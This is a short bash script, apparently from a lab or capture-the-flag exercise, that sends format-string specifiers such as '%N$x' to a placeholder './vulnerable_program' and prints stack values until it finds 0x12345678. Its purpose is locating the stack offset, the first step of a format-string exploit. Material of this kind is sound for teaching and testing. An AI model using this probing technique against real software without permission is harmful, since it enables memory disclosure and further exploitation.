#!/bin/bash

# The vulnerable program name
PROGRAM="./vulnerable_program"

# Loop through the stack positions to find the value 0x12345678
for i in $(seq 1 100); do
    # Construct the input with the format specifier to scan the stack
    input="%$i\$x"
    
    # Pass the input to the vulnerable program and capture the output
    output=$(echo $input | $PROGRAM)
    
    echo "Position $i: $output"
    
    # Check if the value matches 0x12345678
    if [ "$output" == "12345678" ]; then
        echo "Found the value 0x12345678 at position $i"
        break
    fi
done
